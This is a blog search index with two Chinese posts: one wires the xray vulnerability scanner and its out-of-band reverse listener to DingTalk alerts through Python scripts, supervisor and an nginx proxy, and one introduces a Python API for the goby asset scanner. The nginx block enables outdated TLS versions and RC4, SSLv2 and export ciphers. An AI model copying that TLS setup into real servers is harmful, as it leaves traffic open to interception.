<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>xray 设置钉钉告警</title>
    <url>/2019/12/xray_gaojing/</url>
    <content><![CDATA[<h1 id="xray-扫描"><a href="#xray-扫描" class="headerlink" title="xray 扫描"></a>xray 扫描</h1><p>xray目录为<code>/tools/scanner/xray</code></p>
<h2 id="1-安装-supervisord"><a href="#1-安装-supervisord" class="headerlink" title="1. 安装 supervisord"></a>1. 安装 supervisord</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install supervisor</span></pre></td></tr></table></figure>
<h2 id="2-设置-python-告警脚本"><a href="#2-设置-python-告警脚本" class="headerlink" title="2. 设置 python 告警脚本"></a>2. 设置 python 告警脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">token=<span class="string">"XXXXXXXXXXXXXXXXXXXXXXXXXX"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">webhook=<span class="string">"https://oapi.dingtalk.com/robot/send?access_token=%s"</span>%(token)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dingding_markdown_msg</span><span class="params">(webhook, message)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    time_local = time.localtime(message[<span class="string">'create_time'</span>]/<span class="number">1000</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    stime = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time_local)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    data_module = <span class="string">'''**主机:** &#123;name&#125; 出现漏洞   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    **漏洞 url:** &#123;url&#125;   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    **漏洞 port:** &#123;port&#125;     </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    **漏洞 plugin:** &#123;plugin&#125;      </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    **漏洞 vuln_class:** &#123;vuln_class&#125;   </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    **出现时间:** &#123;datatime&#125;    </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    '''</span>.format(name=message[<span class="string">'detail'</span>][<span class="string">'host'</span>], plugin=message[<span class="string">'plugin'</span>], url=message[<span class="string">'target'</span>][<span class="string">'url'</span>],</span></pre></td></tr><tr><td class="code"><pre><span class="line">               port=message[<span class="string">'detail'</span>][<span class="string">'port'</span>],request1=message[<span class="string">'detail'</span>][<span class="string">'request1'</span>],</span></pre></td></tr><tr><td class="code"><pre><span class="line">               request2=message[<span class="string">'detail'</span>][<span class="string">'request2'</span>],vuln_class=message[<span class="string">'vuln_class'</span>],datatime=stime)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    json_text = &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="string">"msgtype"</span>: <span class="string">"markdown"</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="string">"at"</span>: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"atMobiles"</span>: [</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ],</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"isAtAll"</span>: <span class="literal">False</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="string">"markdown"</span>: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"title"</span>:<span class="string">"xray 告警：%s 出现漏洞"</span>%message[<span class="string">'detail'</span>][<span class="string">'host'</span>],</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"text"</span>: data_module</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        info = requests.post(webhook, json.dumps(json_text), headers=headers).content</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(str(e))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/webhook', methods=['POST'])</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xray_webhook</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        data = request.json</span></pre></td></tr><tr><td class="code"><pre><span class="line">        dingding_markdown_msg(webhook,data)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(str(e))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">return</span> <span class="string">'ok'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    app.run(port=<span class="number">7071</span>)</span></pre></td></tr></table></figure>
<h2 id="3-设置-xray-自启动脚本-tools-scanner-xray-xray-sh"><a href="#3-设置-xray-自启动脚本-tools-scanner-xray-xray-sh" class="headerlink" title="3. 设置 xray 自启动脚本 /tools/scanner/xray/xray.sh"></a>3. 设置 xray 自启动脚本 <code>/tools/scanner/xray/xray.sh</code></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd &#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">[ -e &quot;output&#x2F;index.html&quot; ] &amp;&amp; mv output&#x2F;index.html output&#x2F;index-&quot;&#96;date +%Y%m%d%H%M%S&#96;&quot;.html</span></pre></td></tr><tr><td class="code"><pre><span class="line">.&#x2F;xray webscan --listen 127.0.0.1:7777 --html-output  output&#x2F;index.html --webhook-output http:&#x2F;&#x2F;127.0.0.1:7071&#x2F;webhook</span></pre></td></tr></table></figure>
<h2 id="4-Supervisor-conf"><a href="#4-Supervisor-conf" class="headerlink" title="4. Supervisor conf"></a>4. Supervisor conf</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[program:xray]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;xray.sh</span></pre></td></tr><tr><td class="code"><pre><span class="line">user&#x3D;nobody</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart &#x3D; true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;log&#x2F;xray.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes&#x3D;20MB</span></pre></td></tr><tr><td class="code"><pre><span class="line">[program:xraygaojing]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;xray_dingding.py</span></pre></td></tr><tr><td class="code"><pre><span class="line">user&#x3D;nobody</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart &#x3D; true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;log&#x2F;xray_gaojing.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes&#x3D;20MB</span></pre></td></tr></table></figure>
<h1 id="配置-xray-dnslog-http-告警"><a href="#配置-xray-dnslog-http-告警" class="headerlink" title="配置 xray dnslog http 告警"></a>配置 xray dnslog http 告警</h1><h2 id="1-告警脚本"><a href="#1-告警脚本" class="headerlink" title="1. 告警脚本"></a>1. 告警脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#！-*- coding:utf-8 -*-</span></pre></td></tr><tr><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="code"><pre><span class="line">import json</span></pre></td></tr><tr><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="code"><pre><span class="line">import traceback</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">host&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:88&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">token &#x3D; &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">webhook &#x3D; &quot;https:&#x2F;&#x2F;oapi.dingtalk.com&#x2F;robot&#x2F;send?access_token&#x3D;%s&quot; % (token)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">xray_header &#x3D; &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &quot;x-token&quot;: &quot;5a3103e6-163d-11ea-86f9-acde48001122&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;json;charset&#x3D;utf-8&#39;&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">run_data &#x3D; &#123;&quot;http&quot;: &#123;&quot;first&quot;: True, &quot;lastid&quot;: 0&#125;, &quot;dns&quot;: &#123;&quot;first&quot;: True, &quot;lastid&quot;: 0&#125;&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">def dingding_markdown_msg(webhook, message):</span></pre></td></tr><tr><td class="code"><pre><span class="line">    time_local &#x3D; time.localtime(message[&#39;time_stamp&#39;] &#x2F; 1000)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    stime &#x3D; time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time_local)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    data_module &#x3D; &#39;&#39;&#39;**消息类型:** &#123;event_type&#125; 出现消息      </span></pre></td></tr><tr><td class="code"><pre><span class="line">    **消息 id:** &#123;id&#125;    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    **消息 group_id:** &#123;group_id&#125;    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    **消息 remote_addr:** &#123;remote_addr&#125;            </span></pre></td></tr><tr><td class="code"><pre><span class="line">    **消息 request:** &#123;request&#125;     </span></pre></td></tr><tr><td class="code"><pre><span class="line">    **出现时间:** &#123;datatime&#125;       </span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#39;&#39;&#39;.format(id&#x3D;message[&#39;id&#39;], group_id&#x3D;message[&#39;group_id&#39;], remote_addr&#x3D;message[&#39;remote_addr&#39;],</span></pre></td></tr><tr><td class="code"><pre><span class="line">               request&#x3D;message[&#39;request&#39;], event_type&#x3D;message[&#39;event_type&#39;], datatime&#x3D;stime)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    json_text &#x3D; &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &quot;msgtype&quot;: &quot;markdown&quot;,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &quot;at&quot;: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &quot;atMobiles&quot;: [</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ],</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &quot;isAtAll&quot;: False</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &quot;markdown&quot;: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &quot;title&quot;: u&quot;xray 告警：%s 出现消息&quot; % message[&#39;event_type&#39;],</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &quot;text&quot;: data_module</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        info &#x3D; requests.post(webhook, json.dumps(json_text), headers&#x3D;headers).content</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    except Exception as e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(traceback.format_exc())</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">session &#x3D; requests.session()</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">def send_msg():</span></pre></td></tr><tr><td class="code"><pre><span class="line">    httprc &#x3D; session.get(&quot;%s&#x2F;_&#x2F;api&#x2F;event&#x2F;list?lastID&#x3D;&amp;count&#x3D;10&amp;eventType&#x3D;http&amp;action&#x3D;Next&quot;%(host), headers&#x3D;xray_header)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    httpdata &#x3D; httprc.json()[&#39;data&#39;][&#39;events&#39;][0]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    if run_data[&#39;http&#39;][&#39;first&#39;]:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        run_data[&#39;http&#39;][&#39;first&#39;]&#x3D;False</span></pre></td></tr><tr><td class="code"><pre><span class="line">        run_data[&#39;http&#39;][&#39;lastid&#39;] &#x3D; httpdata[&#39;id&#39;]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(&quot;第一次记录 http id：%s 不发送告警&quot;%(httpdata[&#39;id&#39;]))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        if httpdata[&#39;id&#39;] &gt; run_data[&#39;http&#39;][&#39;lastid&#39;]:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            run_data[&#39;http&#39;][&#39;lastid&#39;] &#x3D; httpdata[&#39;id&#39;]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            dingding_markdown_msg(webhook,httpdata)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(&quot;发送 http message %s&quot;%(httpdata[&#39;id&#39;]))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    dnsrc &#x3D; session.get(&quot;%s&#x2F;&#x2F;_&#x2F;api&#x2F;event&#x2F;list?lastID&#x3D;&amp;count&#x3D;10&amp;eventType&#x3D;dns&amp;action&#x3D;Next&quot;%(host), headers&#x3D;xray_header)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    dnsdata &#x3D; dnsrc.json()[&#39;data&#39;][&#39;events&#39;][0]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    if run_data[&#39;dns&#39;][&#39;first&#39;]:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        run_data[&#39;dns&#39;][&#39;first&#39;] &#x3D; False</span></pre></td></tr><tr><td class="code"><pre><span class="line">        run_data[&#39;dns&#39;][&#39;lastid&#39;] &#x3D; dnsdata[&#39;id&#39;]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(&quot;第一次记录 dns id：%s 不发送告警&quot; % (dnsdata[&#39;id&#39;]))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        if dnsdata[&#39;id&#39;] &gt; run_data[&#39;dns&#39;][&#39;lastid&#39;]:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            run_data[&#39;dns&#39;][&#39;lastid&#39;] &#x3D; dnsdata[&#39;id&#39;]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            dingding_markdown_msg(webhook, dnsdata)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(&quot;发送 dns message %s&quot; % (dnsdata[&#39;id&#39;]))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    while True:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            send_msg()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(traceback.format_exc())</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(&quot;wait 5s&quot;)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        time.sleep(5)</span></pre></td></tr></table></figure>
<h2 id="2-Xray-配置文件"><a href="#2-Xray-配置文件" class="headerlink" title="2. Xray 配置文件"></a>2. Xray 配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reverse:</span></pre></td></tr><tr><td class="code"><pre><span class="line">  db_file_path: &quot;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;xray.db&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  token: &quot;xxxxxxxxx&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  http:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    enabled: true</span></pre></td></tr><tr><td class="code"><pre><span class="line">    listen_ip: 0.0.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">    listen_port: 88</span></pre></td></tr><tr><td class="code"><pre><span class="line">  dns:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    enabled: true</span></pre></td></tr><tr><td class="code"><pre><span class="line">    listen_ip: 0.0.0.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">    domain: &quot;xxx.cc&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    is_domain_name_server: true</span></pre></td></tr><tr><td class="code"><pre><span class="line">    # 静态解析规则</span></pre></td></tr><tr><td class="code"><pre><span class="line">    resolve:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    - type: A</span></pre></td></tr><tr><td class="code"><pre><span class="line">      record: mxx</span></pre></td></tr><tr><td class="code"><pre><span class="line">      value: x5.xx.xx.1x0</span></pre></td></tr><tr><td class="code"><pre><span class="line">    - type: A</span></pre></td></tr><tr><td class="code"><pre><span class="line">      record: ns1</span></pre></td></tr><tr><td class="code"><pre><span class="line">      value: x5.xx.xxx.1x0</span></pre></td></tr><tr><td class="code"><pre><span class="line">      ttl: 60</span></pre></td></tr><tr><td class="code"><pre><span class="line">    - type: A</span></pre></td></tr><tr><td class="code"><pre><span class="line">      record: ns2</span></pre></td></tr><tr><td class="code"><pre><span class="line">      ttl: 60</span></pre></td></tr><tr><td class="code"><pre><span class="line">      value: x5.xx.xx.1x0</span></pre></td></tr><tr><td class="code"><pre><span class="line">  client:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    http_base_url: &quot;http:&#x2F;&#x2F;mxx.xx.cc:88&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    dns_server_ip: &quot;&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    remote_server: false</span></pre></td></tr></table></figure>
<h2 id="3-配置-supervisor"><a href="#3-配置-supervisor" class="headerlink" title="3. 配置 supervisor"></a>3. 配置 supervisor</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[program:xray]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;xray reverse</span></pre></td></tr><tr><td class="code"><pre><span class="line">user&#x3D;nobody</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart &#x3D; true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;log&#x2F;xray.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes&#x3D;20MB</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">[program:xray_rec]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command&#x3D;&#x2F;usr&#x2F;bin&#x2F;python &#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;xray_rev_ding.py</span></pre></td></tr><tr><td class="code"><pre><span class="line">user&#x3D;nobody</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart &#x3D; true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;log&#x2F;xray_rev.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes&#x3D;20MB</span></pre></td></tr></table></figure>
<h2 id="4-配置-nginx-https-访问"><a href="#4-配置-nginx-https-访问" class="headerlink" title="4. 配置 nginx https 访问"></a>4. 配置 nginx https 访问</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    listen 80;</span></pre></td></tr><tr><td class="code"><pre><span class="line">     server_name mxx.xxx.cc;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    rewrite ^(.*) https:&#x2F;&#x2F;$host$1 permanent;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">server &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  listen 443 ssl;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  server_name mxx.xxx.cc;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_certificate &#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;mxx.xxx.cc.pem;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_certificate_key &#x2F;tools&#x2F;scanner&#x2F;xray&#x2F;mxx.xxx.cc.key;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_session_timeout 5m;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  ssl_prefer_server_ciphers on;</span></pre></td></tr><tr><td class="code"><pre><span class="line">  location &#x2F; &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">   proxy_pass  http:&#x2F;&#x2F;127.0.0.1:88;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        #Proxy Settings</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_set_header   Host             $host;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_set_header   X-Real-IP        $remote_addr;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_max_temp_file_size 0;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_connect_timeout      90;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_send_timeout         90;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_read_timeout         90;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_buffer_size          4k;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_buffers              4 32k;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_busy_buffers_size    64k;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        proxy_temp_file_write_size 64k;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p><strong>低权限使用1024以下端口</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setcap cap_net_bind_service&#x3D;+eip xray</span></pre></td></tr></table></figure>
<h2 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable supervisor</span></pre></td></tr><tr><td class="code"><pre><span class="line">systemctl start supervisor</span></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Config</category>
      </categories>
      <tags>
        <tag>Config</tag>
      </tags>
  </entry>
  <entry>
    <title>goby python api</title>
    <url>/2019/11/goby-api/</url>
    <content><![CDATA[<h2 id="goby-介绍"><a href="#goby-介绍" class="headerlink" title="goby 介绍"></a>goby 介绍</h2><p><a href="https://gobies.org/" target="_blank" rel="noopener">goby</a>  一个攻击面梳理工具、资产排查工具，用最少的包完成最多的数据整理，谁用谁说OK</p>
<h2 id="开发说明"><a href="#开发说明" class="headerlink" title="开发说明"></a>开发说明</h2><p>接口一共有三个模块 client、poc、asset 所有与客户端相关的都放到 client 与资产相关的放到 asset 与 poc 相关的放到 poc。通过抓包进行分析 api 得出接口</p>
<h2 id="使用文档"><a href="#使用文档" class="headerlink" title="使用文档"></a>使用文档</h2><h3 id="1-安装模块"><a href="#1-安装模块" class="headerlink" title="1. 安装模块"></a>1. 安装模块</h3><p>下载后在此目录下执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Becivells&#x2F;goby-api.git</span></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python setup.py install</span></pre></td></tr></table></figure>
<h3 id="2-使用模块"><a href="#2-使用模块" class="headerlink" title="2. 使用模块"></a>2. 使用模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> goby.v1 <span class="keyword">import</span> GobyApi</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> goby.v1 <span class="keyword">import</span> data</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">z = GobyApi()</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(z.client.version())</span></pre></td></tr><tr><td class="code"><pre><span class="line">envi = z.client.getEnvi()</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(envi)</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(z.client.tasks())</span></pre></td></tr><tr><td class="code"><pre><span class="line">scanresult = z.client.startScan(ips=[<span class="string">"192.168.3.32"</span>], ports=data.ports.ALL_Ports, opt_interface=<span class="string">"en0"</span>)</span></pre></td></tr></table></figure>
